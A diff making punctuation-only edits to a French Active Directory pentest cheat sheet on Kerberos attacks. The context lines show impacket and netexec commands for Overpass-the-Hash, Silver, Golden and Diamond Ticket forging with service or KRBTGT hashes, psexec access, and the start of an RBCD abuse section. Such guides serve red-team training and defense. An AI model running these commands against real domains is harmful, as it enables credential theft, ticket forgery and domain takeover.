@@ -28,7 +28,7 @@ Kerberos fonctionne exactement comme ça :
 
 | Terme | Analogie | Description |
 |-------|---------|-------------|
-| **KDC** (Key Distribution Center) | L'accueil du parc | Le DC — émet les tickets |
+| **KDC** (Key Distribution Center) | L'accueil du parc | Le DC : émet les tickets |
 | **TGT** (Ticket Granting Ticket) | Le bracelet journée | Prouve ton identité auprès du KDC |
 | **TGS** (Ticket Granting Service) | Le ticket attraction | Permet d'accéder à un service précis |
 | **SPN** (Service Principal Name) | Le nom de l'attraction | Identifie un service : `MSSQLSvc/srv.dom:1433` |
@@ -132,7 +132,7 @@ nxc smb $DC_FQDN -u $USER --use-kcache -d $DOMAIN
 
 ## 4. Overpass-the-Hash (OPtH)
 
-Convertir un NT hash en TGT Kerberos — contourne les filtres NTLM.
+Convertir un NT hash en TGT Kerberos : contourne les filtres NTLM.
 
 ```bash
 getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER
@@ -158,7 +158,7 @@ getTGT.py -aesKey <aes256_key_64hex> $DOMAIN_FQDN/$USER
 
 ## 6. Silver Ticket
 
-Forger un **TGS** directement avec le hash du compte de service — sans passer par le DC.
+Forger un **TGS** directement avec le hash du compte de service : sans passer par le DC.
 
 ```bash
 # Prérequis : hash NT du compte de service + SID du domaine + SPN
@@ -179,7 +179,7 @@ mssqlclient.py -k Administrator@sql01.entreprise.local
 
 ## 7. Golden Ticket
 
-Forger un **TGT** avec le hash de **KRBTGT** — le Saint Graal. Accès illimité à tout le domaine.
+Forger un **TGT** avec le hash de **KRBTGT** : le Saint Graal. Accès illimité à tout le domaine.
 
 ```bash
 # Prérequis : hash NT de KRBTGT + SID du domaine (obtenus via DCSync)
@@ -199,7 +199,7 @@ psexec.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN
 
 ## 8. Diamond Ticket (variante furtive)
 
-Modifie le PAC d'un TGT **légitime** au lieu d'en forger un de zéro — moins détectable par les SIEM.
+Modifie le PAC d'un TGT **légitime** au lieu d'en forger un de zéro : moins détectable par les SIEM.
 
 ```bash
 ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN_FQDN \
@@ -233,7 +233,7 @@ psexec.py -k -no-pass target.entreprise.local
 ```
 
 ### RBCD (Resource-Based Constrained Delegation)
-La **cible** contrôle elle-même qui peut déléguer vers elle — attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+La **cible** contrôle elle-même qui peut déléguer vers elle : attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`.
 
 ```bash
 # 1. Créer un compte machine
